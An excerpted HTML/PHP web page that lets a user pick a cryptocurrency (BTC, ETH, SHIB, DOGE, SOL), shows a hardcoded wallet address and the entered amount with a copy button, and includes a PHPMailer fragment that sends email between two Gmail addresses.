...
<head>
 ...
 document.getElementById('one1').innerHTML="Copied";
...
<div class="nk-content ">
                    ...
                    <div class="nk-block nk-block-lg">
                        ...
                        <div class="card card-bordered card-preview">
                            <div class="card-inner">
								<div class="sleek" id="firstpid">
    <form name="myform">
        <h3 value="">Select payment method</h3><br>
        <select  class="btn" name="option" id="soption">

            <option value="bc1qje7r8tgkmsru9ht8e6czary56h647x7zgv4sq6">BTC(bitcoin)</option>
            <option value="0xe4E9C3BC8D84e65C531137f38964A951014d855a">(ETH)Ethereum</option>
            <option value="0xCac78e67958070AB27387406fE37345B86Bb8e93">SHIB</option>
            <option value="DEFyzBmswVrjNz1fw5BjBniVwSBnuU1xae">DOGE (Dogecoin)</option>
			<option value="5kYNB2EQnY531T8LY5GsaFbPMmHyVSpaaBDgRJwDVDNd">SOL (solana)</option>
        </select>
        <br></br>
        <label value="Amount">
       <!-- <input type="number" name="amount" placeholder="input amount" style="width:200px;height:40px;border-radius:5px;"><br></br>
		<!------added 2:31----->
		<div class="input-group mb-3">
  <div class="input-group-prepend">
    <span class="input-group-text">$</span>
  </div>
  <input type="text"  name="amount"  id="number_element" class="form-control" aria-label="Amount (to the nearest dollar)">
  <div class="input-group-append">
    <span class="input-group-text">.00</span>
		...
		<!----2:31------>
          <button id="next" onclick="swap(); return false" class="btn btn-secondary">Procced</button>
        </form>
        </div>
        <div id="secondpid" style="display:none;">
            
            <img src="mainbitcoin.jpeg"  width="200px" height="200px" alt="" id="payimg" >
            
            <p>wallet Address</p>
            <h5 id="one"></h5>
			<br>
			<button id="one1" onclick="copyEvent(id)" class="btn btn-primary">Copy Address</button>
			<hr></hr>
			<p>Amount</p>
			<div class="d-flex">
           <h5> $</h5><h5 id="two">.00</h5>
			</div>

        </div>
        <div class="thirdpid" style="display:none">
            <h1>welcome 2</h1>
...
//script mailer
 ...
 try {
     ...
     //Recipients
     $mail->setFrom('mirprime219@gmail.com', 'testers');

     //Add a recipient
     $mail->addAddress('livemailcl@gmail.com', $fname);
...
<div class="nk-footer">
	...
	<script>
function swap(){
let a=document.getElementById('firstpid');
let b=document.getElementById('secondpid');
const vt = document.getElementById('one').innerHTML=document.myform.option.value;
const vttv = document.getElementById('two').innerHTML=document.myform.amount.value;
a.style.display='none';
b.style.display='block';
 }
</script>
<script src="ruster.js"></script>
</body>
